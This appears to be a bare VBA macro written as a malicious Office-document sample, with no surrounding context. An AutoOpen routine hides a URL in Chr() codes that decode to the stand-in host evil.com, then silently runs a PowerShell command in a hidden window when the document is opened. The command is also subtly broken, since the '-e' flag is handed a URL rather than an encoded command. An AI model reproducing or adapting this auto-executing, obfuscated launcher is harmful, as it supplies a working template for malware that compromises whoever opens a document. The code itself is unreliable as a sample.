Sub AutoOpen()
    Dim str As String
    str = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115) & _
          Chr(58) & Chr(47) & Chr(47) & Chr(101) & Chr(118) & _
          Chr(105) & Chr(108) & Chr(46) & Chr(99) & Chr(111) & Chr(109)
    Dim payload As String
    payload = "powershell -e " & str
    Shell payload, vbHide
End Sub
